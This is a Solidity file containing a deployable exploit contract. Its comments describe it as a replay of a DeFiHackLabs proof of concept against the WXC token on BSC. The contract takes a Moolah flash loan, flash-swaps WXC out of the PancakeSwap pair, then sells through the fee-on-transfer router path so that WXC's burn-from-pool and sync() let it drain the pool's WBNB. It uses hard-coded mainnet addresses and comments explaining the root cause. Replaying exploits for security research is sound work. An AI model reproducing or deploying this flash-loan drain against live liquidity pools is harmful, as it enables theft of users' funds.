// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the WXC Token burn-from-pool + sync() "phantom
// reserve" drain (BSC). The original DeFiHackLabs PoC (test/WXC_Token_exp.sol) runs
// the whole attack INLINE in the Foundry test contract (attacker = address(this)),
// with the Moolah flash-loan callback (onMoolahFlashLoan) and the PancakeSwap flash-
// swap callback (pancakeCall) both implemented directly on the test. This file copies
// that inline logic verbatim into a standalone, deployable contract so the EVM
// Playground can replay it via a normal deploy + attackFunction call.
//
// Root cause (see the vulnerable contract's reconstructed logic in the writeup):
// WXC's sell-tax transfer path treats a transfer INTO its LP pair as a sell, and as
// part of that path it burns the seller's net (post-tax) tokens straight out of the
// pair's own balance and then calls pair.sync(). That collapses the pair's recorded
// reserve0 (WXC) far below its actual WXC balance, so the very next swap() reads the
// gap as "phantom" trader input and pays out almost the entire WBNB reserve for free.

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePairLike {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouterLike {
    // NOTE: unlike swapExactTokensForTokensSupportingFeeOnTransferTokens's sibling
    // (swapExactTokensForTokens), the real PancakeSwap/UniswapV2 router does NOT
    // return anything from this function — declaring a return type here causes
    // Solidity to ABI-decode empty returndata and revert after a successful call.
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IMoolahFlashLoanLike {
    function flashLoan(address token, uint256 assets, bytes memory data) external;
}

contract WXCDrain {
    uint256 constant flashAmount = 49150000000000000000;

    IPancakePairLike constant Cake_LP = IPancakePairLike(0xdA5C7eA4458Ee9c5484fA00F2B8c933393BAC965);
    IERC20Like constant WBNB = IERC20Like(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20Like constant WXC = IERC20Like(0x8087720EeeA59F9F04787065447D52150c09643E);
    IPancakeRouterLike constant Router = IPancakeRouterLike(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IMoolahFlashLoanLike constant ercproxy = IMoolahFlashLoanLike(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);

    function run() external {
        WXC.approve(address(Router), type(uint256).max);

        WBNB.allowance(address(this), address(ercproxy));
        WBNB.approve(address(ercproxy), type(uint256).max);

        ercproxy.flashLoan(address(WBNB), flashAmount, "0x00");
    }

    function onMoolahFlashLoan(uint256 assets, bytes memory data) public {
        WBNB.approve(address(ercproxy), flashAmount);

        uint256 amt0 = 74963130190599057252979324;
        uint256 amt1 = 1;

        // Flash-swap-buy 74.96M WXC out of the pair (repaid below in pancakeCall).
        Cake_LP.swap(
            amt0,
            amt1,
            address(this),
            hex"000000000014bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0300000006000000000000cf3800000044a9059cbb000000000000000000000000da5c7ea4458ee9c5484fa00f2b8c933393bac965000000000000000000000000000000000000000000000002aa17e09796730000000000000000000000000000006f0ae91d"
        );

        uint256 appAmt = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
        WXC.approve(address(Router), appAmt);

        uint256 amtIn = 74963130190599057252979324;
        address[] memory path = new address[](2);
        path[0] = address(WXC);
        path[1] = address(WBNB);
        uint256 deadline = 1754881178;

        // The bug: selling the 74.96M WXC into the pair here triggers WXC's
        // burn-from-pool + pair.sync() on the same call, then the "SupportingFee"
        // router variant reads the pair's post-transfer balance to compute the
        // WBNB payout — draining the pool's WBNB against the phantom reserve gap
        // the burn+sync just created, all inside this single external call.
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amtIn, 0, path, address(this), deadline);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        WBNB.transfer(address(Cake_LP), flashAmount);
    }
}
